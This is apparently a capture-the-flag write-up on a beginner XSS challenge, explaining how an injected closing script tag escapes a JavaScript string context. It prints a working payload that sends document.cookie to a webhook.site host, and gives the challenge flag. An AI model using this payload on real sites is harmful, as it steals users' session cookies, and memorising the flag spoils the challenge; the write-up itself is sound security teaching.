---
title: "XSS Escape — Breaking Out of a Script String Context"
date: 2026-02-28
categories: ["Olicyber"]
series: ["Territoriale 2026 Demo"]
tags: ["web", "xss", "javascript", "csp-bypass", "dom"]
difficulty: "beginner"
summary: "Escape a JavaScript string context inside a script tag by injecting a closing script tag that the sanitizer fails to block."
---

## The Challenge

A web application reflects user input inside a `<script>` tag as a JavaScript string literal:

```html
<script>
  var userInput = "USER_INPUT_HERE";
</script>
```

The server-side sanitizer escapes `<script>` (opening tag) but does not escape `</script>` (closing tag). The flag is in `document.cookie`.

Flag: `flag{3sc4P1nG_fr0M_stR1nGs_3b546727}`

## Approach

The injected content sits inside a JavaScript string. To execute arbitrary JS I need to break out of two things: the string literal and the script block itself. The usual string breakout (`"` + code) might be filtered or might not work cleanly depending on what follows. The `</script>` oversight gives me a cleaner path.

If the sanitizer blocks `<script>` but not `</script>`, injecting `</script>` causes the browser to close the existing script block at that point in the document. Anything after it is treated as HTML again. I can then open a fresh `<script>` tag and write arbitrary JavaScript.

The payload is:

```
</script><script>fetch('https://webhook.site/UUID/?flag='+document.cookie)</script>
```

When the browser parses the page, it hits my injected `</script>` and terminates the original script block (the JS before my injection is now malformed and silently ignored or partially executed — doesn't matter). It then encounters my new `<script>` block and executes the `fetch` call, sending `document.cookie` to the webhook.

## Solution

The XSS payload injected into the input field:

```
</script><script>fetch('https://webhook.site/a3120d37-32a4-467f-85ad-d2e39f8d8419/?flag=' + document.cookie)</script>
```

The flag arrived on the webhook as: `flag{3sc4P1nG_fr0M_stR1nGs_3b546727}`

## What I Learned

Sanitizers that block opening tags but not closing tags are dangerously incomplete. The browser's HTML parser is stateful — a stray `</script>` terminates the current script context regardless of what the server intended. Any sanitizer protecting script injection needs to handle both `<script>` and `</script>`.
